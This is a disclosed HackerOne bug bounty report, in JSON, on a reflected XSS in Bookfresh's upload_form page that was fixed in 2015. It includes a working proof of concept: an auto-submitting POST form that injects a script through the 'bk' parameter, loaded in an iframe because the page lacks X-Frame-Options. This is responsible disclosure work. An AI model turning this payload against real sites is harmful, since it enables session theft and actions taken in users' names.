{"id":31187,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTE4Nw==","url":"https://hackerone.com/reports/31187","title":"Reflected XSS on www.bookfresh.com/index.html?view=upload_form","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-10-13T01:52:44.576Z","submitted_at":"2014-10-13T01:52:44.576Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stefanofinding","url":"/stefanofinding","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":432,"url":"https://hackerone.com/bookfresh","handle":"bookfresh","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/432/2faea4478de17a1a299dced58b4e96235cc492f0_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/432/2faea4478de17a1a299dced58b4e96235cc492f0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Bookfresh","twitter_handle":"","website":"https://www.bookfresh.com/","about":"Let your customers book and pay online from any device, 24/7. While you’re busy with your customers, BookFresh is busy filling up your schedule."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-08-31T10:31:55.025Z","bug_reporter_agreed_on_going_public_at":"2017-08-01T10:31:45.998Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The issue is in the view _upload_form_.\r\n\r\n**Description**\r\nWhen you show an upload form in the site you use an URL like this: https://www.bookfresh.com/index.html?standalone=1\u0026e=0c551a759eb62ba457d017569617eaa8\u0026bk=FFFFFF\u0026view=upload_form\r\nAnd you show the value of the parameter `bk` in the page: `\u003cstyle\u003ebody{ background-color: #[VALUE_OF_BK]; }\u003c/style\u003e`. \r\n\r\nYou have protection for XSS because you encode or remove tags like `\u003cscript\u003e`, etc.\r\nBut the problem is that you are only protecting the `GET` requests. So, if I do a `POST` request the value of `bk` is shown in the page without encoding or removing the tags.\r\n\r\nAnother problem is that when the file https://www.bookfresh.com/index.html is loaded from the server there is not `X-Frame-Options` header set in the response. So, it will be more easy to exploit the vulnerability.\r\n\r\n**Steps to reproduce**:\r\n1. Create a HTML file with this content:\r\n\r\n        \u003cform action=\"https://www.bookfresh.com/index.html\" method=\"post\"\u003e\r\n         \u003cinput type=\"hidden\" name=\"bk\" value=\"\u003c/style\u003e\u003cscript\u003ealert(document.domain);\u003c/script\u003e\u003cstyle\u003e\"\u003e\r\n         \u003cinput type=\"hidden\" name=\"view\" value=\"upload_form\"\u003e\r\n        \u003c/form\u003e\r\n        \u003cscript\u003e\r\n         document.forms[0].submit();\r\n        \u003c/script\u003e\r\n\r\n2. Create a HTML file with this content:\r\n\r\n        \u003ciframe src=\"[path_of_the_file_from_step_1]\"\u003e\u003c/iframe\u003e\r\n\r\n3. Put the files on a server or run a test server on the localhost with something like: `php -S localhost:8000`\r\n4. Visit the file created in the step 2 and wait a few seconds.\r\n5. You will see an `alert()` with the domain of the frame: www.bookfresh.com.\r\n\r\nIt works on the last version of Firefox and it doesn't work on the last version of Chrome.","vulnerability_information_html":"\u003cp\u003eThe issue is in the view \u003cu\u003eupload_form\u003c/u\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003cbr\u003e\nWhen you show an upload form in the site you use an URL like this: \u003ca title=\"https://www.bookfresh.com/index.html?standalone=1\u0026amp;e=0c551a759eb62ba457d017569617eaa8\u0026amp;bk=FFFFFF\u0026amp;view=upload_form\" href=\"/redirect?url=https%3A%2F%2Fwww.bookfresh.com%2Findex.html%3Fstandalone%3D1%26e%3D0c551a759eb62ba457d017569617eaa8%26bk%3DFFFFFF%26view%3Dupload_form\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.bookfresh.com/index.html?standalone=1\u0026amp;e=0c551a759eb62ba457d017569617eaa8\u0026amp;bk=FFFFFF\u0026amp;view=upload_form\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nAnd you show the value of the parameter \u003ccode\u003ebk\u003c/code\u003e in the page: \u003ccode\u003e\u0026lt;style\u0026gt;body{ background-color: #[VALUE_OF_BK]; }\u0026lt;/style\u0026gt;\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eYou have protection for XSS because you encode or remove tags like \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e, etc.\u003cbr\u003e\nBut the problem is that you are only protecting the \u003ccode\u003eGET\u003c/code\u003e requests. So, if I do a \u003ccode\u003ePOST\u003c/code\u003e request the value of \u003ccode\u003ebk\u003c/code\u003e is shown in the page without encoding or removing the tags.\u003c/p\u003e\n\n\u003cp\u003eAnother problem is that when the file \u003ca title=\"https://www.bookfresh.com/index.html\" href=\"/redirect?url=https%3A%2F%2Fwww.bookfresh.com%2Findex.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.bookfresh.com/index.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is loaded from the server there is not \u003ccode\u003eX-Frame-Options\u003c/code\u003e header set in the response. So, it will be more easy to exploit the vulnerability.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSteps to reproduce\u003c/strong\u003e:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eCreate a HTML file with this content:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;form action=\u0026quot;https://www.bookfresh.com/index.html\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;\n \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;bk\u0026quot; value=\u0026quot;\u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain);\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;\u0026quot;\u0026gt;\n \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;view\u0026quot; value=\u0026quot;upload_form\u0026quot;\u0026gt;\n\u0026lt;/form\u0026gt;\n\u0026lt;script\u0026gt;\n document.forms[0].submit();\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCreate a HTML file with this content:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;iframe src=\u0026quot;[path_of_the_file_from_step_1]\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ePut the files on a server or run a test server on the localhost with something like: \u003ccode\u003ephp -S localhost:8000\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eVisit the file created in the step 2 and wait a few seconds.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eYou will see an \u003ccode\u003ealert()\u003c/code\u003e with the domain of the frame: \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.bookfresh.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.bookfresh.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIt works on the last version of Firefox and it doesn\u0026#39;t work on the last version of Chrome.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-08-31T10:31:46.066Z","allow_singular_disclosure_after":-105044433.0994351,"singular_disclosure_allowed":true,"vote_count":4,"voters":["eveeez","r3y","sumit7","hacklad"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":141304,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your submission. We are looking into this further and will get back to you as soon as we have more information.\n","markdown_message":"\u003cp\u003eThank you for your submission. We are looking into this further and will get back to you as soon as we have more information.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-13T13:53:31.345Z","updated_at":"2014-10-13T13:53:31.345Z","actor":{"username":"skanalyst","cleared":false,"url":"/skanalyst","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"bookfresh","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":141671,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok. Thank you.","markdown_message":"\u003cp\u003eOk. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-13T21:58:14.508Z","updated_at":"2014-10-13T21:58:14.508Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"bookfresh","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":364321,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Sorry for the delay, a fix has been deployed, can you please verify?","markdown_message":"\u003cp\u003eSorry for the delay, a fix has been deployed, can you please verify?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-27T03:23:00.293Z","updated_at":"2015-03-27T03:23:00.293Z","actor":{"username":"rafaelmaza","cleared":false,"url":"/rafaelmaza","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"stefanofinding","url":"/stefanofinding"},"genius_execution_id":null,"team_handle":"bookfresh","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":364410,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @rafaelmaza,\nseems fixed. 'bk' only accepts color values.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/rafaelmaza\"\u003e@rafaelmaza\u003c/a\u003e,\u003cbr\u003e\nseems fixed. \u0026#39;bk\u0026#39; only accepts color values.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-27T09:20:43.364Z","updated_at":"2015-03-27T09:20:43.364Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"bookfresh","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1881936,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I'm not sure it could be possible to disclose this report? Anyway, if someone is in the other side reading this message it would be great if you agree to disclose it.  👍","markdown_message":"\u003cp\u003eI\u0026#39;m not sure it could be possible to disclose this report? Anyway, if someone is in the other side reading this message it would be great if you agree to disclose it.  👍\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-01T10:31:46.027Z","updated_at":"2017-08-01T10:31:46.027Z","first_to_agree":true,"actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"bookfresh","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1968374,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-31T10:31:55.045Z","updated_at":"2017-08-31T10:31:55.045Z","actor":{"url":"/bookfresh","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/432/2faea4478de17a1a299dced58b4e96235cc492f0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Bookfresh"}},"genius_execution_id":null,"team_handle":"bookfresh","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}